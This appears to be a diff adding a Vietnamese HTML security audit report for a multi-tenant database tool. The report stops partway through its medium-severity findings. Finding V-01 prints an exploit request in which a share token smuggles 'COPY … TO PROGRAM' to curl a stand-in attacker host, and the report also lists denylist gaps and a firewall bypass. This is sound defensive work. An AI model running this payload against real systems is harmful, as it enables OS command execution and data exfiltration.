@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security Audit — SecureConnect</title>
+<style>
+:root{
+  --bg:#f7f7f5; --surface:#fff; --border:#e3e1dc; --text:#1a1a19; --muted:#6b6a66;
+  --crit:#b3261e; --crit-bg:#fdecea; --high:#b45309; --high-bg:#fdf3e3;
+  --med:#8a6d00; --med-bg:#fbf7e0; --low:#4a5568; --low-bg:#eef1f5;
+  --ok:#1e6b45; --ok-bg:#e8f5ee; --code-bg:#f2f1ee; --accent:#3b5bdb;
+}
+@media (prefers-color-scheme:dark){
+  :root:not([data-theme="light"]){
+    --bg:#191918; --surface:#212120; --border:#35342f; --text:#eceae4; --muted:#a3a29c;
+    --crit:#ff8a80; --crit-bg:#3a1d1a; --high:#fbbf24; --high-bg:#3a2f14;
+    --med:#e6d16a; --med-bg:#332f16; --low:#c3cbd6; --low-bg:#26292e;
+    --ok:#7fd6a6; --ok-bg:#16301f; --code-bg:#2a2a28; --accent:#8da2fb;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#191918; --surface:#212120; --border:#35342f; --text:#eceae4; --muted:#a3a29c;
+  --crit:#ff8a80; --crit-bg:#3a1d1a; --high:#fbbf24; --high-bg:#3a2f14;
+  --med:#e6d16a; --med-bg:#332f16; --low:#c3cbd6; --low-bg:#26292e;
+  --ok:#7fd6a6; --ok-bg:#16301f; --code-bg:#2a2a28; --accent:#8da2fb;
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);
+  font:16px/1.65 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",sans-serif;}
+.wrap{max-width:940px;margin:0 auto;padding:40px 20px 80px}
+h1{font-size:1.9rem;line-height:1.25;margin:0 0 6px}
+h2{font-size:1.25rem;margin:44px 0 14px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+h3{font-size:1rem;margin:0 0 4px}
+.sub{color:var(--muted);margin:0 0 28px;font-size:.92rem}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+code{background:var(--code-bg);padding:.12em .38em;border-radius:4px;font-size:.87em}
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:8px;
+  padding:12px 14px;overflow-x:auto;font-size:.83rem;line-height:1.5;margin:10px 0}
+pre code{background:none;padding:0}
+.tiles{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:10px;margin:24px 0 8px}
+.tile{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:14px}
+.tile .n{font-size:1.7rem;font-weight:600;line-height:1}
+.tile .l{font-size:.74rem;text-transform:uppercase;letter-spacing:.06em;color:var(--muted);margin-top:5px}
+.t-crit .n{color:var(--crit)} .t-high .n{color:var(--high)}
+.t-med .n{color:var(--med)} .t-low .n{color:var(--low)}
+.f{background:var(--surface);border:1px solid var(--border);border-left:4px solid var(--border);
+  border-radius:8px;padding:16px 18px;margin:14px 0}
+.f.crit{border-left-color:var(--crit)} .f.high{border-left-color:var(--high)}
+.f.med{border-left-color:var(--med)} .f.low{border-left-color:var(--low)}
+.hd{display:flex;align-items:baseline;gap:10px;flex-wrap:wrap;margin-bottom:10px}
+.tag{font-size:.68rem;font-weight:700;letter-spacing:.07em;text-transform:uppercase;
+  padding:3px 8px;border-radius:999px;white-space:nowrap}
+.tag.crit{background:var(--crit-bg);color:var(--crit)}
+.tag.high{background:var(--high-bg);color:var(--high)}
+.tag.med{background:var(--med-bg);color:var(--med)}
+.tag.low{background:var(--low-bg);color:var(--low)}
+.tag.ok{background:var(--ok-bg);color:var(--ok)}
+.id{font-family:ui-monospace,monospace;font-size:.8rem;color:var(--muted)}
+.f p{margin:8px 0}
+.lbl{font-weight:600;font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;
+  color:var(--muted);display:block;margin-top:12px}
+.scroll{overflow-x:auto;margin:12px 0}
+table{border-collapse:collapse;width:100%;font-size:.88rem;min-width:520px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--border);vertical-align:top}
+th{font-size:.74rem;text-transform:uppercase;letter-spacing:.05em;color:var(--muted);font-weight:600}
+.note{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:16px 0}
+.note.warn{border-left:4px solid var(--high)}
+ul{padding-left:22px;margin:8px 0} li{margin:5px 0}
+.ok-list li{margin:7px 0}
+a{color:var(--accent)}
+footer{margin-top:56px;padding-top:18px;border-top:1px solid var(--border);
+  color:var(--muted);font-size:.83rem}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<h1>Security Audit — SecureConnect (DBManager)</h1>
+<p class="sub">
+  Rà soát tĩnh toàn bộ source code · commit <code>8cdfbb0</code> · nhánh <code>main</code> · 2026-08-18<br>
+  Phạm vi: 114 file TypeScript trong <code>SecureConnect/src</code>, 26 API route, cấu hình deploy.<br>
+  <strong>Đã xác minh cấu hình runtime thật trên <code>mcp-80</code></strong> (mục 2) — các mục Critical không còn là giả định.
+</p>
+
+<div class="tiles">
+  <div class="tile t-crit"><div class="n">2</div><div class="l">Critical</div></div>
+  <div class="tile t-high"><div class="n">3</div><div class="l">High</div></div>
+  <div class="tile t-med"><div class="n">4</div><div class="l">Medium</div></div>
+  <div class="tile t-low"><div class="n">2</div><div class="l">Low</div></div>
+  <div class="tile"><div class="n">26</div><div class="l">Route đã soát</div></div>
+</div>
+
+<div class="note warn">
+  <strong>Bối cảnh quyết định mức độ:</strong> đây là công cụ <em>multi-tenant công khai</em>
+  (<code>AUTH_ALLOW_ANY=true</code>) — bất kỳ ai có tài khoản Google đều đăng nhập được, và
+  <strong>share link được phát cho người ngoài</strong>. Vì vậy "người dùng đã đăng nhập"
+  và "người giữ share link" đều phải coi là <em>không đáng tin</em>. Hai lỗi Critical bên dưới
+  đều nằm ở ranh giới này.
+</div>
+
+<h2>1. Tổng quan</h2>
+<div class="scroll">
+<table>
+  <thead><tr><th>ID</th><th>Vấn đề</th><th>Mức</th><th>Vị trí</th></tr></thead>
+  <tbody>
+    <tr><td class="id">V-01</td><td>Share "chỉ đọc" leo thang thành quyền GHI trên DB của chủ sở hữu <span class="tag ok">Đã sửa</span></td><td><span class="tag crit">Critical</span></td><td><code>api/db/[id]/query/route.ts:16</code></td></tr>
+    <tr><td class="id">V-02</td><td>Kết nối PostgreSQL chạy <strong>plaintext</strong> theo mặc định</td><td><span class="tag crit">Critical</span></td><td><code>dbConnector.ts:144</code></td></tr>
+    <tr><td class="id">V-03</td><td><code>validateSql</code> là denylist regex — thiếu COPY / EXECUTE / SET / REPLACE / MERGE</td><td><span class="tag high">High</span></td><td><code>sqlValidator.ts:9</code></td></tr>
+    <tr><td class="id">V-04</td><td><code>ctx.readonly</code> được tính nhưng <strong>không nơi nào kiểm tra</strong> <span class="tag ok">Đã sửa</span></td><td><span class="tag high">High</span></td><td><code>route-helper.ts:11,133</code></td></tr>
+    <tr><td class="id">V-11</td><td>UFW có rule <code>ALLOW Anywhere</code> trên 80/443 → vô hiệu hoá toàn bộ giới hạn Cloudflare</td><td><span class="tag high">High</span></td><td>firewall <code>mcp-80</code></td></tr>
+    <tr><td class="id">V-05</td><td>MySQL TLS bật nhưng <strong>không xác thực chứng chỉ</strong></td><td><span class="tag med">Medium</span></td><td><code>dbConnector.ts:105</code></td></tr>
+    <tr><td class="id">V-06</td><td>Route <code>query</code> trả nguyên văn lỗi driver ra client</td><td><span class="tag med">Medium</span></td><td><code>query/route.ts:97</code></td></tr>
+    <tr><td class="id">V-07</td><td><code>getClientIp</code> tin header do client gửi → đầu độc audit log</td><td><span class="tag med">Medium</span></td><td><code>rateLimit.ts:83-92</code></td></tr>
+    <tr><td class="id">V-08</td><td>CSP cho phép <code>script-src 'unsafe-inline'</code></td><td><span class="tag med">Medium</span></td><td><code>next.config.mjs</code></td></tr>
+    <tr><td class="id">V-09</td><td>Header <code>Content-Encoding: gzip</code> gắn cứng cho mọi <code>/api/*</code></td><td><span class="tag low">Low</span></td><td><code>next.config.mjs</code></td></tr>
+    <tr><td class="id">V-10</td><td>Rate limit fail-open về in-memory, không chia sẻ giữa instance</td><td><span class="tag low">Low</span></td><td><code>rateLimit.ts:66</code></td></tr>
+  </tbody>
+</table>
+</div>
+
+<div class="note">
+  <strong>Trạng thái xử lý (2026-08-18):</strong> đã sửa bằng code
+  <strong>V-01, V-02, V-03, V-04, V-06</strong> — <em>chưa commit, chưa deploy</em>.
+  Suite: <strong>241/241 pass</strong> (+5 test mới), <code>tsc --noEmit</code> sạch,
+  policy-ci / red-team / golden xanh.
+  <br><br>
+  <strong>Còn mở:</strong> V-05 (env), V-07–V-10, và <strong>V-11</strong> (cần thao tác phía server).
+  Hai phát hiện phụ về chính harness được ghi ở <strong>mục 9</strong>.
+</div>
+
+<h2>2. Xác minh cấu hình runtime trên mcp-80</h2>
+<p>Config <em>không</em> nằm trong biến môi trường container — nó nằm ở
+  <code>/app/.env.production</code> (quyền <code>600</code>, owner <code>nextjs</code>) và được Next.js nạp
+  lúc chạy. Container chỉ có <code>REDIS_URL</code>. Chỉ đọc <strong>tên biến</strong> và giá trị của các
+  <em>cờ bảo mật</em>; không đọc giá trị secret nào.</p>
+
+<div class="scroll">
+<table>
+  <thead><tr><th>Biến</th><th>Giá trị thật</th><th>Nghĩa</th></tr></thead>
+  <tbody>
+    <tr><td><code>DB_SSL_STRICT</code></td><td><code>false</code></td><td><span class="tag crit">V-02 xác nhận sống</span> PostgreSQL đi plaintext; MySQL không kiểm cert</td></tr>
+    <tr><td><code>DB_SSL_DISABLED</code></td><td>không có</td><td><span class="tag ok">OK</span> MySQL vẫn giữ opportunistic TLS</td></tr>
+    <tr><td><code>REQUIRE_CLOUDFLARE</code></td><td><code>false</code></td><td>App không tự chặn request không qua CF</td></tr>
+    <tr><td><code>AUTH_ALLOW_ANY</code></td><td><code>true</code></td><td>Cả 2 allowlist rỗng ⇒ mọi tài khoản Google đăng nhập được (đúng chủ ý)</td></tr>
+    <tr><td><code>MSSQL_TRUST_SERVER_CERT</code></td><td><code>false</code></td><td><span class="tag ok">OK</span> MSSQL kiểm chứng chỉ đầy đủ</td></tr>
+    <tr><td><code>ALLOW_PRIVATE_HOSTS</code></td><td><code>false</code></td><td><span class="tag ok">OK</span> SSRF guard đang hoạt động</td></tr>
+    <tr><td><code>AUTH_URL</code></td><td>đúng domain production</td><td><span class="tag ok">OK</span> CSRF origin check hiệu lực</td></tr>
+    <tr><td><code>SESSION_MAXAGE_SEC</code></td><td><code>86400</code></td><td><span class="tag ok">OK</span> 24h như thiết kế</td></tr>
+    <tr><td><code>VAULT_MASTER_SECRET_OLD</code></td><td>không có</td><td>Chưa cấu hình xoay khoá vault — ghi nhận, chưa phải lỗi</td></tr>
+  </tbody>
+</table>
+</div>
+
+<p><strong>Kết luận:</strong> V-02 và V-05 <strong>không còn là giả định — chúng đang sống trên production.</strong>
+  Ngược lại, ba cờ dễ sai nhất (<code>MSSQL_TRUST_SERVER_CERT</code>, <code>ALLOW_PRIVATE_HOSTS</code>,
+  <code>DB_SSL_DISABLED</code>) đều được đặt đúng.</p>
+
+<h2>3. Critical</h2>
+
+<div class="f crit">
+  <div class="hd"><span class="tag crit">Critical</span><span class="id">V-01</span>
+    <h3>Người giữ share link "chỉ đọc" có thể GHI vào database của chủ sở hữu</h3></div>
+
+  <p>Ba sự thật độc lập, khi ghép lại thì phá vỡ ranh giới read-only:</p>
+  <ul>
+    <li><code>api/db/[id]/query/route.ts:16</code> đặt <code>allowShare: true</code> — nghĩa là người
+      <em>không phải chủ sở hữu</em>, chỉ cầm <code>x-share-token</code>, vẫn gọi được route thực thi SQL tự do.</li>
+    <li>Rào chắn duy nhất là <code>validateSql()</code> — một regex denylist (xem V-03).</li>
+    <li><strong>Driver thực sự cho phép nhiều câu lệnh trong một request:</strong>
+      <ul>
+        <li>PostgreSQL — <code>dbConnector.ts</code> gọi <code>client.query(bound, params)</code> với
+          <code>params === undefined</code> (route query không truyền tham số). node-postgres khi đó dùng
+          <em>simple query protocol</em>, vốn cho phép nhiều statement ngăn cách bởi <code>;</code>.</li>
+        <li>MSSQL — <code>req.query(bound)</code> thực thi cả một <em>batch</em>.</li>
+        <li>MySQL thì <em>an toàn</em>: <code>multipleStatements: false</code> (dòng 103).</li>
+      </ul>
+    </li>
+  </ul>
+
+  <span class="lbl">Hình dạng khai thác</span>
+  <pre><code>POST /api/db/&lt;id&gt;/query
+x-share-token: &lt;token chi-doc duoc phat cho nguoi ngoai&gt;
+
+{"sql": "SELECT 1; COPY (SELECT 1) TO PROGRAM 'curl http://attacker/$(whoami)'"}</code></pre>
+  <p>Chuỗi bắt đầu bằng <code>SELECT</code> nên qua được whitelist; <code>COPY</code> và
+    <code>PROGRAM</code> đều không có trong danh sách chặn. Trên PostgreSQL, nếu tài khoản DB
+    có quyền cao thì <code>COPY … TO PROGRAM</code> là <strong>thực thi lệnh hệ điều hành</strong>,
+    không chỉ là ghi dữ liệu.</p>
+
+  <span class="lbl">Vì sao nó lọt lưới</span>
+  <p>Chính comment trong <code>route-helper.ts:103</code> đã nêu đúng luật:
+    <em>"Mutation routes MUST NOT set allowShare"</em>. Nhưng route <code>query</code> được xếp loại là
+    "đọc" vì tên nó là query — trong khi thứ nó thực sự làm là chạy SQL bất kỳ. Phân loại theo
+    <em>tên route</em> thay vì theo <em>năng lực thực tế</em> chính là chỗ hở.</p>
+
+  <span class="lbl">Đề xuất xử lý</span>
+  <ul>
+    <li><strong>Ngay lập tức</strong>: bỏ <code>allowShare: true</code> ở <code>query/route.ts</code>
+      và <code>ai-sql/route.ts</code>. Người dùng share vẫn duyệt được bảng/cột/rows qua các route
+      chuyên dụng — không mất tính năng cốt lõi.</li>
+    <li>Truyền SQL cho pg qua <em>extended protocol</em> (luôn đưa mảng <code>params</code>, kể cả rỗng)
+      để driver tự chặn multi-statement, giống MySQL đang làm.</li>
+    <li>Với MSSQL, chặn <code>;</code> ngoài chuỗi literal trước khi thực thi.</li>
+  </ul>
+
+  <div class="note">
+    <strong>✅ Đã sửa (chưa deploy).</strong> Gỡ <code>allowShare</code> khỏi <code>query</code> và
+    <code>ai-sql</code>. Với <code>ai-sql</code> lý do khác: nó không thực thi SQL nên không phải đường
+    leo thang — nhưng nó tiêu ngân sách LLM của server và nhận prompt tự do, cả hai đều không nên
+    thuộc về người cầm share link.
+    <br><br>
+    Kèm theo ở FE: tab <strong>SQL</strong> giờ được ẩn với share user. Nếu không làm bước này, họ vẫn
+    thấy tab, bấm vào, và nhận 403 khó hiểu — sửa backend mà bỏ FE thì chỉ đổi lỗ hổng thành lỗi UX.
+    Hai đường còn lại (<code>pg</code> extended protocol, chặn <code>;</code> cho MSSQL) <em>chưa</em>
+    làm — chúng là phòng thủ chiều sâu cho chính chủ sở hữu, cần thiết kế riêng.
+  </div>
+</div>
+
+<div class="f crit">
+  <div class="hd"><span class="tag crit">Critical</span><span class="id">V-02</span>
+    <h3>Kết nối PostgreSQL không mã hoá theo mặc định — lộ mật khẩu DB trên đường truyền</h3></div>
+
+  <pre><code>// dbConnector.ts:144
+ssl: SSL_STRICT ? { rejectUnauthorized: true, servername: rec.host } : undefined
+//   SSL_STRICT = process.env.DB_SSL_STRICT === "true"   ← mac dinh FALSE</code></pre>
+
+  <p><strong>Đã xác nhận trên production:</strong> <code>/app/.env.production</code> trên
+    <code>mcp-80</code> có <code>DB_SSL_STRICT=false</code>. Đây là lỗ hổng đang sống, không phải
+    mặc định lý thuyết.</p>
+
+  <p>Với node-postgres, <code>ssl: undefined</code> không có nghĩa "TLS lỏng" mà là
+    <strong>không TLS</strong>. Vì <code>DB_SSL_STRICT</code> đang là <code>false</code>, mọi kết nối
+    PostgreSQL của người dùng đi ra Internet ở dạng <strong>cleartext</strong>: mật khẩu DB,
+    tên bảng, và toàn bộ dữ liệu trả về.</p>
+
+  <p>Đây là một biến thể nguy hiểm vì tài liệu nói ngược lại. <code>docs/srs.html:280</code> mô tả
+    <code>DB_SSL_STRICT</code> là <em>"PG/MSSQL cert validation"</em> — người đọc hiểu rằng tắt nó
+    thì chỉ mất phần <em>kiểm chứng chỉ</em>. Thực tế tắt nó là mất luôn <em>mã hoá</em>.
+    So sánh với MySQL ngay bên trên (dòng 105) vốn có nhánh riêng để giữ TLS khi không strict —
+    PostgreSQL thiếu đúng nhánh đó.</p>
+
+  <span class="lbl">Đề xuất xử lý</span>
+  <pre><code>// Cho PG bat chuoc dung mo hinh cua MySQL: TLS luon bat, strict la tuy chon
+ssl: SSL_DISABLED
+  ? undefined
+  : (SSL_STRICT ? { rejectUnauthorized: true, servername: rec.host }
+                : { rejectUnauthorized: false })</code></pre>
+  <p>Và sửa lại mô tả trong <code>spec.md</code> / <code>srs.html</code> cho khớp hành vi thật —
+    tài liệu sai ở đây nguy hiểm ngang chính đoạn code.</p>
+
+  <div class="note">
+    <strong>✅ Đã sửa (chưa deploy).</strong> PostgreSQL giờ dùng đúng mô hình của MySQL: TLS luôn bật,
+    <code>DB_SSL_STRICT</code> chỉ quyết định có kiểm chứng chỉ hay không, và chỉ
+    <code>DB_SSL_DISABLED</code> mới tắt hẳn.
+    <br><br>
+    <strong>Hệ quả cần biết trước khi deploy:</strong> nếu có người dùng đang kết nối tới một PG server
+    <em>không</em> hỗ trợ TLS, họ sẽ mất kết nối và phải đặt <code>DB_SSL_DISABLED=true</code>.
+    Đổi lại, mật khẩu của họ không còn đi cleartext. Đây là đánh đổi có chủ ý, không phải tác dụng phụ.
+    <br><br>
+    <strong>Vì sao chưa bật <code>DB_SSL_STRICT=true</code>:</strong> sau fix này, để nguyên
+    <code>false</code> nghĩa là "mã hoá nhưng chưa xác thực cert" (V-05, Medium) — chứ không còn là
+    "cleartext" (Critical). Phần Critical đã được xử lý bằng code. Bật strict là bước siết tiếp theo và
+    <strong>sẽ ngắt mọi DB dùng self-signed cert</strong>, nên để thành một quyết định riêng thay vì
+    kèm vào đây.
+  </div>
+</div>
+
+<h2>4. High</h2>
+
+<div class="f high">
+  <div class="hd"><span class="tag high">High</span><span class="id">V-11</span>
+    <h3>Firewall "chỉ cho Cloudflare" thực chất mở cho toàn Internet</h3></div>
+
+  <p><code>ufw status</code> trên <code>mcp-80</code> liệt kê ~40 rule giới hạn cổng 80/443 theo dải
+    IP Cloudflare (v4 lẫn v6). Nhìn qua thì đây là một firewall được cấu hình cẩn thận. Nhưng trong
+    cùng danh sách còn có <strong>bốn rule catch-all</strong>:</p>
+
+  <pre><code>80/tcp        ALLOW  Anywhere        # HTTP - certbot + redirect
+443/tcp       ALLOW  Anywhere        # HTTPS - MCP server
+80/tcp  (v6)  ALLOW  Anywhere (v6)   # HTTP - certbot + redirect
+443/tcp (v6)  ALLOW  Anywhere (v6)   # HTTPS - MCP server</code></pre>
+
+  <p>UFW khớp rule đầu tiên trúng. Bốn dòng này cho phép <em>mọi nguồn</em>, nên toàn bộ ~40 rule
+    Cloudflare phía trên trở thành <strong>vô nghĩa</strong> — chúng không thu hẹp gì cả.
+    Origin <code>65.108.62.80</code> mở với cả Internet, trên cả IPv4 và IPv6
+    (server có địa chỉ v6 public <code>2a01:4f9:c013:2be5::1</code>).</p>
+
+  <p>Xác minh: <code>curl --resolve DBManager.allin1site.com:443:65.108.62.80</code> → <strong>HTTP 200</strong>.
+    Nginx phục vụ đúng vhost khi được gọi thẳng bằng IP, không cần đi qua Cloudflare.</p>
+
+  <span class="lbl">Vì sao đáng lo</span>
+  <ul>
+    <li>Cloudflare WAF, chống DDoS, rate limit, bot protection — <strong>bỏ qua được hết</strong> bằng cách
+      gọi thẳng IP origin. Ảnh hưởng <em>toàn bộ 12+ site</em> trên máy này, không riêng DBManager.</li>
+    <li>Kết hợp với <code>REQUIRE_CLOUDFLARE=false</code>: app cũng không tự chặn. Không tầng nào chặn cả.</li>
+    <li>Kéo theo V-07: header <code>cf-connecting-ip</code> chỉ đáng tin khi request <em>thực sự</em> đi qua
+      Cloudflare. Vì không phải vậy, bất kỳ ai cũng ghi được IP tuỳ ý vào audit log.</li>
+  </ul>
+
+  <div class="note warn">
+    <strong>Đây đúng là kiểu lỗi mà C12 nói tới:</strong> một biện pháp bảo vệ <em>tồn tại, nhìn thấy được,
+    trông như đang chạy</em> — nhưng không hề chặn cái gì. Nguy hiểm hơn không có firewall, vì
+    "không có firewall" thì ai cũng thấy, còn cái này đọc <code>ufw status</code> lại thấy an tâm.
+  </div>
+
+  <span class="lbl">Đã điều tra: vì sao 4 rule đó tồn tại</span>
+  <p>Hai câu hỏi đặt ra ban đầu — certbot dùng challenge gì, và MCP có cần vào thẳng không — đều đã có
+    câu trả lời. Chúng cho thấy <strong>không thể xoá cả bốn rule</strong>, nhưng xoá được một nửa.</p>
+
+  <div class="scroll">
+  <table>
+    <thead><tr><th>Cert (10 cái)</th><th>Authenticator</th><th>DNS</th><th>Cần cổng 80 mở rộng?</th></tr></thead>
+    <tbody>
+      <tr><td>8 cert (gồm <code>allin1site-wildcard</code> phục vụ DBManager)</td><td><code>dns-cloudflare</code></td><td>proxied</td><td><span class="tag ok">Không</span> DNS-01 không dùng HTTP</td></tr>
+      <tr><td><code>video-service.allin1site.com</code></td><td><code>nginx</code> (HTTP-01)</td><td>proxied qua CF</td><td><span class="tag ok">Không</span> validation đi qua CF → tới origin từ IP Cloudflare</td></tr>
+      <tr><td><code>mcp.zerocodefee.com</code></td><td><code>webroot</code> (HTTP-01)</td><td><strong>trỏ thẳng 65.108.62.80, KHÔNG qua CF</strong></td><td><span class="tag crit">CÓ</span> Let's Encrypt validate từ IP bất kỳ, không thuộc dải CF</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <p>Vậy <strong>một domain duy nhất</strong> — <code>mcp.zerocodefee.com</code> — là lý do tồn tại của cả
+    hai rule catch-all IPv4: cổng 80 cho webroot renewal, cổng 443 vì nó DNS-only nên client phải vào
+    thẳng origin. Comment <em>"certbot"</em> và <em>"MCP server"</em> đều chính xác. Xoá chúng sẽ làm
+    <strong>gãy gia hạn cert và ngắt chính MCP server</strong> — tức là ngắt công cụ đang dùng để sửa.</p>
+
+  <span class="lbl">Hai rule IPv6 thì khác — xoá được</span>
+  <p><code>mcp.zerocodefee.com</code> <strong>không có AAAA record</strong>, nên không cần v6 để renew
+    hay để truy cập. Kiểm chứng bằng thực tế: trong <code>/var/log/nginx/access.log</code>,
+    <strong>0 trên 1376</strong> request đến từ địa chỉ IPv6. Đường v6 đang mở nhưng không ai dùng —
+    đúng định nghĩa của bề mặt tấn công thừa.</p>
+
+  <span class="lbl">Phương án — khuyến nghị B</span>
+  <ul>
+    <li><strong>A — Xoá 2 rule catch-all IPv6.</strong> Rủi ro thấp nhất, thu hẹp một nửa bề mặt,
+      không gãy gì (có bằng chứng log). Nhưng <em>không</em> giải quyết được vấn đề chính, vì
+      đường IPv4 vẫn mở.</li>
+    <li><strong>B — A, cộng với chặn ở tầng nginx (khuyến nghị).</strong> Với các vhost <em>proxied qua
+      CF</em> (gồm DBManager), thêm kiểm tra IP nguồn thuộc dải Cloudflare ngay trong server block, trả 403
+      nếu không phải. <code>mcp.zerocodefee.com</code> giữ nguyên vì nó vốn không đi qua CF.
+      Đây là chỗ enforcement <em>nên</em> nằm: firewall không phân biệt được vhost, nginx thì có.
+      Không gãy certbot, không gãy MCP.</li>
+    <li><strong>C — Chuyển <code>mcp.zerocodefee.com</code> sang dns-cloudflare + bật proxy</strong>,
+      rồi xoá cả 4 rule. Sạch nhất về nguyên tắc, nhưng nếu MCP cần kết nối dài/websocket vượt giới hạn
+      của Cloudflare thì sẽ hỏng theo cách khó chẩn đoán. Chỉ chọn nếu bạn biết chắc MCP chịu được CF.</li>
+  </ul>
+  <p><strong>Vì sao chọn B:</strong> nó tách được hai nhu cầu đang bị gộp làm một. Cổng phải mở cho
+    <em>một</em> domain DNS-only, nhưng điều đó không có nghĩa <em>mọi</em> vhost phải chấp nhận request
+    không qua CF. Firewall là công cụ sai để diễn đạt phân biệt đó; nginx là công cụ đúng.</p>
+  <p>Bổ sung rẻ và độc lập: bật <code>REQUIRE_CLOUDFLARE=true</code> trong
+    <code>.env.production</code> của DBManager. Chỉ bảo vệ riêng DBManager chứ không phải 12 site,
+    nhưng chỉ tốn một dòng và một lần restart — đáng làm ngay cả khi B đã triển khai.</p>
+</div>
+
+<div class="f high">
+  <div class="hd"><span class="tag high">High</span><span class="id">V-03</span>
+    <h3><code>validateSql</code> là denylist — thiếu nhiều động từ ghi</h3></div>
+  <p>Cách tiếp cận "cho phép câu bắt đầu bằng SELECT, rồi chặn từ khoá xấu" luôn thua trước
+    một danh sách từ khoá không đầy đủ. Những gì <em>không</em> có trong
+    <code>DANGEROUS_KEYWORDS</code> (<code>sqlValidator.ts:9</code>):</p>
+  <div class="scroll">
+  <table>
+    <thead><tr><th>Từ khoá thiếu</th><th>Hệ QT</th><th>Làm được gì</th></tr></thead>
+    <tbody>
+      <tr><td><code>COPY … TO/FROM PROGRAM</code></td><td>PostgreSQL</td><td>Thực thi lệnh OS / đọc-ghi file</td></tr>
+      <tr><td><code>EXECUTE</code></td><td>MSSQL, PG</td><td><code>\bEXEC\b</code> <strong>không</strong> khớp "EXECUTE" — SQL động lọt qua</td></tr>
+      <tr><td><code>SET</code></td><td>tất cả</td><td>Đổi biến session/global (vd bật <code>general_log</code>)</td></tr>
+      <tr><td><code>REPLACE</code>, <code>MERGE</code></td><td>MySQL, MSSQL</td><td>Ghi dữ liệu mà không dùng INSERT/UPDATE</td></tr>
+      <tr><td><code>RENAME</code>, <code>VACUUM</code>, <code>REFRESH</code></td><td>MySQL, PG</td><td>Đổi cấu trúc / tác động vận hành</td></tr>
+    </tbody>
+  </table>
+  </div>
+  <p>Ngược lại, denylist còn <strong>chặn nhầm</strong> câu đọc hợp lệ:
+    <code>SELECT * FROM t WHERE status='update'</code> bị từ chối vì chữ <code>update</code> nằm
+    trong chuỗi literal. Một bộ lọc vừa lọt cái nguy hiểm vừa chặn cái vô hại sẽ nhanh chóng bị
+    người dùng tìm cách né.</p>
+  <span class="lbl">Đề xuất xử lý</span>
+  <p>Chuyển gánh nặng khỏi regex: (a) chặn multi-statement ở tầng driver (V-01),
+    (b) tạo <strong>DB user chỉ có quyền SELECT</strong> cho đường share/read-only — đây là
+    biện pháp duy nhất không phụ thuộc vào việc đoán đúng mọi từ khoá,
+    (c) giữ regex như lớp phòng thủ phụ, không phải lớp chính.</p>
+
+  <div class="note">
+    <strong>✅ Đã sửa một phần (chưa deploy) — (a).</strong> <code>pg</code> giờ luôn nhận mảng values
+    (kể cả rỗng), nên node-postgres dùng <em>extended protocol</em>: một request = một statement, do
+    driver bảo đảm chứ không phải do đoán đúng từ khoá. Đây là điểm mấu chốt — nó đóng đường
+    multi-statement cho <em>cả chủ sở hữu</em>, không riêng share user.
+    <br><br>
+    <strong>Chưa làm:</strong> chặn <code>;</code> cho MSSQL, và (b) DB user chỉ-SELECT. Cả hai cần
+    thiết kế riêng. Denylist regex vẫn còn nguyên các lỗ đã liệt kê ở bảng trên — nó chỉ không còn là
+    <em>lớp duy nhất</em> trên PostgreSQL nữa.
+  </div>
+</div>
+
+<div class="f high">
+  <div class="hd"><span class="tag high">High</span><span class="id">V-04</span>
+    <h3><code>ctx.readonly</code> được tính ra rồi bỏ đó — không có lớp phòng thủ thứ hai</h3></div>
+  <p><code>route-helper.ts</code> đặt <code>readonly: true</code> cho đường share (dòng 133) và khai báo
+    hẳn trong kiểu <code>RouteCtx</code>. Nhưng tìm toàn repo:</p>
+  <pre><code>$ grep -rn "ctx.readonly" src/    →  0 ket qua</code></pre>
+  <p>Không một route nào đọc cờ này. Nghĩa là điều duy nhất giữ cho share ở mức chỉ-đọc là
+    <em>lập trình viên nhớ không truyền <code>allowShare</code> vào handler ghi</em>. Hôm nay
+    các handler mutation trong <code>rows/route.ts</code> làm đúng — nhưng V-01 cho thấy quy ước
+    này đã hỏng một lần rồi.</p>
+  <span class="lbl">Đề xuất xử lý</span>
+  <p>Cho <code>authorize()</code> nhận thêm <code>mutation: true</code>, và khi
+    <code>ctx.readonly &amp;&amp; mutation</code> thì trả 403 ngay tại chỗ — biến quy ước thành ràng buộc
+    mà compiler/runtime kiểm được, thay vì một câu comment.</p>
+
+  <div class="note">
+    <strong>✅ Đã sửa (chưa deploy).</strong> <code>authorize()</code> nhận <code>mutation?: boolean</code>;
+    khai báo đồng thời <code>allowShare</code> + <code>mutation</code> bị từ chối thẳng như lỗi cấu hình.
+    Đã gắn <code>mutation: true</code> cho 5 handler ghi (<code>rows</code> POST/PUT/DELETE,
+    <code>bulk</code> PUT/DELETE). Thêm 5 test khoá hành vi này lại.
+    <br><br>
+    <strong>Test bắt được một chi tiết đáng giá:</strong> ban đầu share-token gửi tới route ghi bị
+    <em>bỏ qua âm thầm</em> — vẫn bị chặn, nhưng rơi xuống nhánh owner-lookup và ghi audit log là
+    <code>CONNECTION_NOT_FOUND</code>, không phân biệt được với một link hết hạn. "Có người thử ghi qua
+    share link chỉ-đọc" chính là sự kiện cần nhìn thấy về sau, nên nó được cấp mã riêng
+    <code>SHARE_READONLY</code> + 403. Theo C14, một kênh cảnh báo chỉ có giá trị khi nó nói đúng
+    chuyện gì đã xảy ra.
+  </div>
+</div>
+
+<h2>5. Medium &amp; Low</h2>
+
+<div class="f med">
+  <div class="hd"><span class="tag med">Medium</span><span class="id">V-05</span>
+    <h3>MySQL: TLS bật nhưng <code>rejectUnauthorized: false</code></h3></div>
+  <p><strong>Đã xác nhận sống trên production</strong> (<code>DB_SSL_STRICT=false</code>).
+    Kết nối được mã hoá nhưng
